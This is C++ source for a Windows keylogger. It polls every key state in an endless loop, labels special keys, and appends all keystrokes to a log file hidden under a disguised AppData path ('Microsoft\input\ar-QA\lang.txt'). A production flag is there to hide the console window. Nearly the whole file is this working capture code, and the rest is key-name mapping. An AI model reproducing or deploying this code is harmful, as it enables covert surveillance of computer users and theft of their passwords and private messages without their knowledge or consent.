// CMake Logger.cpp : Defines the entry point for the application.
//

#include "CppKeyLogger.h"
#include <Windows.h>
#include <fstream>


#include <WinUser.h>

using namespace std;

#define DELIMITER " "
#define LOG_LOCATION "C:\\Users\\harsj\\AppData\\Local\\Microsoft\\input\\ar-QA\\"
#define LOG_FILENAME "lang.txt"
#define PRODUCTION false


bool handle_special_key_press(char key, std::ostream& stream);
void log(std::ostream&);

//const char* valid_log_directories[] = {
//	"lang.txt",
//	"usa.txt",
//	"nine.txt"
//};

int main()
{
	// to hide the window
	ShowWindow(GetConsoleWindow(), PRODUCTION ? SW_HIDE : SW_SHOWNORMAL);
	cout << "Hello CMake." << endl;
	cout << "Logging Begins ...." << endl;

	// Getting output stream ready
	ofstream out_file;
	out_file.open(LOG_LOCATION LOG_FILENAME, ios::app);
	
	// what if we are unable to open a file, Try different locations from list !
	if (out_file.is_open())
	{
		log(out_file);
	}
	else {
		// log(cout);
	}

	out_file.close();
	return 0;
}

void log(std::ostream& Sink)
{
	char key = 0;
	bool handled_as_special_key = false;

	while (true)
	{
		for (key = 0; key < 0xfe; key++)
		{
			if (GetAsyncKeyState(key) & 1)
			{
				handled_as_special_key = handle_special_key_press(key, Sink);
				if (handled_as_special_key) continue;
				Sink << key << DELIMITER;
			}
		}
		Sleep(1000);
	}
}

inline bool handle_special_key_press(char key, std::ostream& stream)
{
	switch (key)
	{
	case VK_LBUTTON:
		stream << "LBUTTON" << DELIMITER;
		break;
	case VK_RBUTTON:
		stream << "RBUTTON" << DELIMITER;
		break;
	case VK_CANCEL:
		stream << "CANCEL" << DELIMITER;
		break;
	case VK_MBUTTON:
		stream << "MBUTTON" << DELIMITER;
		break;
	case VK_XBUTTON1:
		stream << "XBUTTON1" << DELIMITER;
		break;
	case VK_XBUTTON2:
		stream << "XBUTTON2" << DELIMITER;
		break;
	case VK_BACK:
		stream << "BACK" << DELIMITER;
		break;
	case VK_TAB:
		stream << "TAB" << DELIMITER;
		break;
	case VK_CLEAR:
		stream << "CLEAR" << DELIMITER;
		break;
	case VK_RETURN:
		stream << "RETURN" << DELIMITER;
		break;
	case VK_SHIFT:
		stream << "SHIFT" << DELIMITER;
		break;
	case VK_CONTROL:
		stream << "CONTROL" << DELIMITER;
		break;
	case VK_MENU:
		stream << "MENU" << DELIMITER;
		break;
	case VK_PAUSE:
		stream << "PAUSE" << DELIMITER;
		break;
	case VK_CAPITAL:
		stream << "CAPITAL" << DELIMITER;
		break;
	case VK_KANA:
		stream << "KANA" << DELIMITER;
		break;
		/*case VK_HANGUEL:
			stream << "HANGUEL" << DELIMITER;
			break;
		case VK_HANGUL:
			stream << "HANGUL" << DELIMITER;*/
		break;
	case VK_IME_ON:
		stream << "IME_ON" << DELIMITER;
		break;
	case VK_JUNJA:
		stream << "JUNJA" << DELIMITER;
		break;
	case VK_FINAL:
		stream << "FINAL" << DELIMITER;
		break;
	case VK_HANJA:
		stream << "HANJA" << DELIMITER;
		break;
		//case VK_KANJI:
		//	stream << "KANJI" << DELIMITER;
		break;
	case VK_IME_OFF:
		stream << "IME_OFF" << DELIMITER;
		break;
	case VK_ESCAPE:
		stream << "ESCAPE" << DELIMITER;
		break;
	case VK_CONVERT:
		stream << "CONVERT" << DELIMITER;
		break;
	case VK_NONCONVERT:
		stream << "NONCONVERT" << DELIMITER;
		break;
	case VK_ACCEPT:
		stream << "ACCEPT" << DELIMITER;
		break;
	case VK_MODECHANGE:
		stream << "MODECHANGE" << DELIMITER;
		break;
	case VK_SPACE:
		stream << "SPACE" << DELIMITER;
		break;
	case VK_PRIOR:
		stream << "PRIOR" << DELIMITER;
		break;
	case VK_NEXT:
		stream << "NEXT" << DELIMITER;
		break;
	case VK_END:
		stream << "END" << DELIMITER;
		break;
	case VK_HOME:
		stream << "HOME" << DELIMITER;
		break;
	case VK_LEFT:
		stream << "LEFT" << DELIMITER;
		break;
	case VK_UP:
		stream << "UP" << DELIMITER;
		break;
	case VK_RIGHT:
		stream << "RIGHT" << DELIMITER;
		break;
	case VK_DOWN:
		stream << "DOWN" << DELIMITER;
		break;
	case VK_SELECT:
		stream << "SELECT" << DELIMITER;
		break;
	case VK_PRINT:
		stream << "PRINT" << DELIMITER;
		break;
	case VK_EXECUTE:
		stream << "EXECUTE" << DELIMITER;
		break;
	case VK_SNAPSHOT:
		stream << "SNAPSHOT" << DELIMITER;
		break;
	case VK_INSERT:
		stream << "INSERT" << DELIMITER;
		break;
	case VK_DELETE:
		stream << "DELETE" << DELIMITER;
		break;
	case VK_HELP:
		stream << "HELP" << DELIMITER;
		break;
	case VK_LWIN:
		stream << "LWIN" << DELIMITER;
		break;
	case VK_RWIN:
		stream << "RWIN" << DELIMITER;
		break;
	case VK_APPS:
		stream << "APPS" << DELIMITER;
		break;
	case VK_SLEEP:
		stream << "SLEEP" << DELIMITER;
		break;
	case VK_NUMPAD0:
		stream << "NUMPAD0" << DELIMITER;
		break;
	case VK_NUMPAD1:
		stream << "NUMPAD1" << DELIMITER;
		break;
	case VK_NUMPAD2:
		stream << "NUMPAD2" << DELIMITER;
		break;
	case VK_NUMPAD3:
		stream << "NUMPAD3" << DELIMITER;
		break;
	case VK_NUMPAD4:
		stream << "NUMPAD4" << DELIMITER;
		break;
	case VK_NUMPAD5:
		stream << "NUMPAD5" << DELIMITER;
		break;
	case VK_NUMPAD6:
		stream << "NUMPAD6" << DELIMITER;
		break;
	case VK_NUMPAD7:
		stream << "NUMPAD7" << DELIMITER;
		break;
	case VK_NUMPAD8:
		stream << "NUMPAD8" << DELIMITER;
		break;
	case VK_NUMPAD9:
		stream << "NUMPAD9" << DELIMITER;
		break;
	case VK_MULTIPLY:
		stream << "MULTIPLY" << DELIMITER;
		break;
	case VK_ADD:
		stream << "ADD" << DELIMITER;
		break;
	case VK_SEPARATOR:
		stream << "SEPARATOR" << DELIMITER;
		break;
	case VK_SUBTRACT:
		stream << "SUBTRACT" << DELIMITER;
		break;
	case VK_DECIMAL:
		stream << "DECIMAL" << DELIMITER;
		break;
	case VK_DIVIDE:
		stream << "DIVIDE" << DELIMITER;
		break;
	case VK_F1:
		stream << "F1" << DELIMITER;
		break;
	case VK_F2:
		stream << "F2" << DELIMITER;
		break;
	case VK_F3:
		stream << "F3" << DELIMITER;
		break;
	case VK_F4:
		stream << "F4" << DELIMITER;
		break;
	case VK_F5:
		stream << "F5" << DELIMITER;
		break;
	case VK_F6:
		stream << "F6" << DELIMITER;
		break;
	case VK_F7:
		stream << "F7" << DELIMITER;
		break;
	case VK_F8:
		stream << "F8" << DELIMITER;
		break;
	case VK_F9:
		stream << "F9" << DELIMITER;
		break;
	case VK_F10:
		stream << "F10" << DELIMITER;
		break;
	case VK_F11:
		stream << "F11" << DELIMITER;
		break;
	case VK_F12:
		stream << "F12" << DELIMITER;
		break;
	case VK_F13:
		stream << "F13" << DELIMITER;
		break;
	case VK_F14:
		stream << "F14" << DELIMITER;
		break;
	case VK_F15:
		stream << "F15" << DELIMITER;
		break;
	case VK_F16:
		stream << "F16" << DELIMITER;
		break;
	case VK_F17:
		stream << "F17" << DELIMITER;
		break;
	case VK_F18:
		stream << "F18" << DELIMITER;
		break;
	case VK_F19:
		stream << "F19" << DELIMITER;
		break;
	case VK_F20:
		stream << "F20" << DELIMITER;
		break;
	case VK_F21:
		stream << "F21" << DELIMITER;
		break;
	case VK_F22:
		stream << "F22" << DELIMITER;
		break;
	case VK_F23:
		stream << "F23" << DELIMITER;
		break;
	case VK_F24:
		stream << "F24" << DELIMITER;
		break;
	case VK_NUMLOCK:
		stream << "NUMLOCK" << DELIMITER;
		break;
	case VK_SCROLL:
		stream << "SCROLL" << DELIMITER;
		break;
	case VK_LSHIFT:
		stream << "LSHIFT" << DELIMITER;
		break;
	case VK_RSHIFT:
		stream << "RSHIFT" << DELIMITER;
		break;
	case VK_LCONTROL:
		stream << "LCONTROL" << DELIMITER;
		break;
	case VK_RCONTROL:
		stream << "RCONTROL" << DELIMITER;
		break;
	case VK_LMENU:
		stream << "LMENU" << DELIMITER;
		break;
	case VK_RMENU:
		stream << "RMENU" << DELIMITER;
		break;
	case VK_BROWSER_BACK:
		stream << "BROWSER_BACK" << DELIMITER;
		break;
	case VK_BROWSER_FORWARD:
		stream << "BROWSER_FORWARD" << DELIMITER;
		break;
	case VK_BROWSER_REFRESH:
		stream << "BROWSER_REFRESH" << DELIMITER;
		break;
	case VK_BROWSER_STOP:
		stream << "BROWSER_STOP" << DELIMITER;
		break;
	case VK_BROWSER_SEARCH:
		stream << "BROWSER_SEARCH" << DELIMITER;
		break;
	case VK_BROWSER_FAVORITES:
		stream << "BROWSER_FAVORITES" << DELIMITER;
		break;
	case VK_BROWSER_HOME:
		stream << "BROWSER_HOME" << DELIMITER;
		break;
	case VK_VOLUME_MUTE:
		stream << "VOLUME_MUTE" << DELIMITER;
		break;
	case VK_VOLUME_DOWN:
		stream << "VOLUME_DOWN" << DELIMITER;
		break;
	case VK_VOLUME_UP:
		stream << "VOLUME_UP" << DELIMITER;
		break;
	case VK_MEDIA_NEXT_TRACK:
		stream << "MEDIA_NEXT_TRACK" << DELIMITER;
		break;
	case VK_MEDIA_PREV_TRACK:
		stream << "MEDIA_PREV_TRACK" << DELIMITER;
		break;
	case VK_MEDIA_STOP:
		stream << "MEDIA_STOP" << DELIMITER;
		break;
	case VK_MEDIA_PLAY_PAUSE:
		stream << "MEDIA_PLAY_PAUSE" << DELIMITER;
		break;
	case VK_LAUNCH_MAIL:
		stream << "LAUNCH_MAIL" << DELIMITER;
		break;
	case VK_LAUNCH_MEDIA_SELECT:
		stream << "LAUNCH_MEDIA_SELECT" << DELIMITER;
		break;
	case VK_LAUNCH_APP1:
		stream << "LAUNCH_APP1" << DELIMITER;
		break;
	case VK_LAUNCH_APP2:
		stream << "LAUNCH_APP2" << DELIMITER;
		break;
	case VK_OEM_1:
		stream << "OEM_1" << DELIMITER;
		break;
	case VK_OEM_PLUS:
		stream << "OEM_PLUS" << DELIMITER;
		break;
	case VK_OEM_COMMA:
		stream << "OEM_COMMA" << DELIMITER;
		break;
	case VK_OEM_MINUS:
		stream << "OEM_MINUS" << DELIMITER;
		break;
	case VK_OEM_PERIOD:
		stream << "OEM_PERIOD" << DELIMITER;
		break;
	case VK_OEM_2:
		stream << "OEM_2" << DELIMITER;
		break;
	case VK_OEM_3:
		stream << "OEM_3" << DELIMITER;
		break;
	case VK_OEM_4:
		stream << "OEM_4" << DELIMITER;
		break;
	case VK_OEM_5:
		stream << "OEM_5" << DELIMITER;
		break;
	case VK_OEM_6:
		stream << "OEM_6" << DELIMITER;
		break;
	case VK_OEM_7:
		stream << "OEM_7" << DELIMITER;
		break;
	case VK_OEM_8:
		stream << "OEM_8" << DELIMITER;
		break;
	case VK_OEM_102:
		stream << "OEM_102" << DELIMITER;
		break;
	case VK_PROCESSKEY:
		stream << "PROCESSKEY" << DELIMITER;
		break;
	case VK_PACKET:
		stream << "PACKET" << DELIMITER;
		break;
	case VK_ATTN:
		stream << "ATTN" << DELIMITER;
		break;
	case VK_CRSEL:
		stream << "CRSEL" << DELIMITER;
		break;
	case VK_EXSEL:
		stream << "EXSEL" << DELIMITER;
		break;
	case VK_EREOF:
		stream << "EREOF" << DELIMITER;
		break;
	case VK_PLAY:
		stream << "PLAY" << DELIMITER;
		break;
	case VK_ZOOM:
		stream << "ZOOM" << DELIMITER;
		break;
	case VK_NONAME:
		stream << "NONAME" << DELIMITER;
		break;
	case VK_PA1:
		stream << "PA1" << DELIMITER;
		break;
	case VK_OEM_CLEAR:
		stream << "OEM_CLEAR" << DELIMITER;
		break;
	default:
		return false;
	}
	return true;
}